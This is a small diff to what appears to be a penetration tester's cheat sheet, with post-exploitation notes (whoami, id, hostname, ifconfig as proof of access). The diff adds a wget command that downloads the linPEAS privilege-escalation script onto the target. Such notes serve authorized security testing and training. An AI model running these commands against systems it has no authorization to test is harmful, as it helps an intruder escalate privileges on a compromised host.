@@ -167,3 +167,7 @@ fg # this will be invisible
 
 # post exploitation - proof - moneyshot
 whoami && id && hostname && ifconfig
+
+# privesc - scripts - download linPEAS
+wget "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh" -O linpeas.sh
+
